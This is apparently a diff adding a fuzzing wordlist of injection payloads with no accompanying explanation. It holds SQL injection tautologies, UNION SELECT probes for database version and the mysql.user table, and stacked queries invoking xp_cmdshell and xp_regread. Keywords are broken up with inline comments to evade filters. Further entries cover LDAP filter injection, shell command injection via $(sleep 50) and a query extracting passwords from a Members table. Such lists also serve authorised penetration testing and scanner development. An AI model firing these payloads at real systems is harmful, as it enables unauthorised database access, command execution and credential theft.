@@ -1,0 +1,163 @@
+'
+"
+#
+-
+--
+'%20--
+--';
+'%20;
+=%20'
+=%20;
+=%20--
+\x23
+\x27
+\x3D%20\x3B'
+\x3D%20\x27
+\x27\x4F\x52 S/**/ELECT *
+\x27\x6F\x72 S/**/ELECT *
+'o/**/r%20s/**/elect *
+admin'--
+<>"'%;)(&+
+'%20o/**/r%20''='
+'%20o/**/r%20'x'='x
+"%20o/**/r%20"x"="x
+')%20o/**/r%20('x'='x
+0 o/**/r 1=1
+' o/**/r 0=0 --
+" o/**/r 0=0 --
+o/**/r 0=0 --
+' o/**/r 0=0 #
+" o/**/r 0=0 #
+o/**/r 0=0 #
+' o/**/r 1=1--
+" o/**/r 1=1--
+' o/**/r '1'='1'--
+"' o/**/r 1 --'"
+o/**/r 1=1--
+o/**/r%201=1
+o/**/r%201=1 --
+' o/**/r 1=1 o/**/r ''='
+" o/**/r 1=1 o/**/r ""="
+' o/**/r a=a--
+" o/**/r "a"="a
+') o/**/r ('a'='a
+") o/**/r ("a"="a
+hi" o/**/r "a"="a
+hi" o/**/r 1=1 --
+hi' o/**/r 1=1 --
+hi' o/**/r 'a'='a
+hi') o/**/r ('a'='a
+hi") o/**/r ("a"="a
+'hi' o/**/r 'x'='x';
+@variable
+,@variable
+P/**/RINT
+P/**/RINT @@variable
+s/**/elect
+i/**/nsert
+as
+o/**/r
+procedure
+limit
+o/**/rder by
+asc
+desc
+d/**/elete
+u/**/pdate
+distinct
+having
+truncate
+r/**/eplace
+like
+ha/**/ndler
+bfilename
+' o/**/r username like '%
+' o/**/r uname like '%
+' o/**/r userid like '%
+' o/**/r uid like '%
+' o/**/r user like '%
+exec xp
+exec sp
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_passwo/**/rd
+\x27U/**/NION S/**/ELECT
+' U/**/NION S/**/ELECT
+' U/**/NION ALL S/**/ELECT
+' o/**/r (EXISTS)
+' (s/**/elect top 1
+'||UTL_HTTP.REQUEST
+1;S/**/ELECT%20*
+to_timestamp_tz
+tz_offset
+&lt;&gt;&quot;'%;)(&amp;+
+'%20o/**/r%201=1
+%27%20o/**/r%201=1
+%20$(sleep%2050)
+%20'sleep%2050'
+char%4039%41%2b%40S/**/ELECT
+&apos;%20O/**/R
+'sqlattempt1
+(sqlattempt2)
+|
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+(
+%28
+)
+%29
+&
+%26
+!
+%21
+' o/**/r 1=1 o/**/r ''='
+' o/**/r ''='
+x' o/**/r 1=1 o/**/r 'x'='y
+/
+//
+//*
+*/*
+-1'
+ ' a/**/nd 1=1--
+ ' o/**/r 'a'='a
+ '='
+ ' a/**/nd 'c'='c
+ ' a/**/nd 1# 
+ ' o/**/r '1
+ ' o/**/r 1--+
+ " o/**/r ""="
+ "="
+ '='
+ '=0#
+a/**/nd 1=1#
+a/**/nd 1
+a/**/nd t/**/rue = 1--
+a/**/nd 1*1
+a/**/nd 3-2 =0
+ #
+  --
+  /*  */ 
+  -- 
+  ;
+  ; %00
+  ` 
+ ' u/**/nion 1 --
+ ' u/**/nion 1,2 --
+ ' u/**/nion 1,2,3 --
+ ' u/**/nion 1,2,'a',4,5 -- 
+ ' u/**/nion 1,2,3,'a',5 --
+-1' u/**/nion s/**/elect 1,2,3,version(),0 #
+ -1' u/**/nion s/**/elect 1,2,3,(s/**/elect version()),0 #
+ -1' u/**/nion s/**/elect 1,2,3,user f/**/rom mysql.user #
+b', 'c','d')--
+b', 'c','d')('a','b','c','d')#
+'passwo/**/rd'
+passwo/**/rd
+S/**/ELECT/*avoid-spaces*/passwo/**/rd/**/F/**/ROM/**/Members
+
